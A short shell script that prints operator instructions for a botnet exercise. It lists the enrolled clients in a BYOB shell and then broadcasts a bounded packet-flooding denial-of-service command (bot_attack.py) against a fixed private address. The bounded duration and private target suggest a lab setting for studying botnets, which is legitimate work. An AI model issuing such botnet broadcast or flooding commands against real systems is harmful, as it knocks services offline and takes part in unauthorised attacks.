#!/bin/sh

cat <<'EOF'
In the BYOB shell, list the enrolled clients:

  sessions

Then broadcast the bounded Y13 attack command:

  broadcast python3 /opt/botnet-dos/bot_attack.py --duration 10 --pps 200 --packet-size 1200

The target is fixed inside bot_attack.py at 10.151.0.71:9000.
EOF
